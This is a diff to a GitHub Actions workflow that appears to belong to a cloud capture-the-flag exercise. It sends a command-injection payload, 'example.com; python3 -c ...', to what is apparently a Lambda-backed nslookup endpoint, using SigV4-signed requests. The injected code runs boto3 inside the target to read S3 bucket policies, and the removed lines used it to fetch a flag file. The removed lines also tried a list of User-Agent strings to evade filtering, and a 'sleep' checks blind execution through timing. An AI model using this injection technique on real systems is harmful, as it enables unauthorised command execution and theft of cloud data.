@@ -1,4 +1,4 @@
-name: Stage2-20-Test-Real-Lambda-UserAgent
+name: Stage2-21-Test-BucketPolicy-Read
 
 on:
   push:
@@ -24,7 +24,7 @@ jobs:
         run: |
           python3 -m pip install requests requests-aws4auth --quiet
 
-      - name: Test User-Agents inside nslookupv2
+      - name: Test bucket policy access
         run: |
           python3 - <<'PY'
           import os
@@ -42,43 +42,27 @@ jobs:
               session_token=os.environ["AWS_SESSION_TOKEN"]
           )
 
-          user_agents = [
-              "nslookupv2",
-              "nslookup",
-              "lambdaRole",
-              "AWS_Lambda",
-              "AWSLambda",
-              "CloudEscape",
-              "Amazon CloudFront",
-              "aws-cli",
-              "Boto3",
-              "botocore"
+          buckets = [
+              "userad88e2b168aa387e",
+              "logad88e2b168aa387e"
           ]
 
-          for user_agent in user_agents:
+          for bucket in buckets:
               python_code = (
                   "import boto3;"
-                  "from botocore.config import Config;"
                   "s=boto3.client("
                   "'s3',"
                   "region_name='us-east-1',"
-                  "endpoint_url='https://s3.us-east-1.amazonaws.com',"
-                  "config=Config("
-                  f"user_agent={user_agent!r},"
-                  "s3={'addressing_style':'path'}"
-                  ")"
+                  "endpoint_url='https://s3.us-east-1.amazonaws.com'"
                   ");"
-                  "s.get_object("
-                  "Bucket='logad88e2b168aa387e',"
-                  "Key='flag.txt'"
-                  ");"
+                  f"s.get_bucket_policy(Bucket={bucket!r});"
               )
 
               injected = (
                   "example.com; "
                   "python3 -c "
                   + repr(python_code)
-                  + " >/tmp/ua_result 2>&1 && sleep 8"
+                  + " >/tmp/policy_result 2>&1 && sleep 8"
               )
 
               start = time.monotonic()
@@ -92,7 +76,7 @@ jobs:
 
               elapsed = time.monotonic() - start
 
-              print("UA=" + user_agent)
+              print("BUCKET=" + bucket)
               print("HTTP=" + str(response.status_code))
               print("ELAPSED=%.2f" % elapsed)
               print("---")
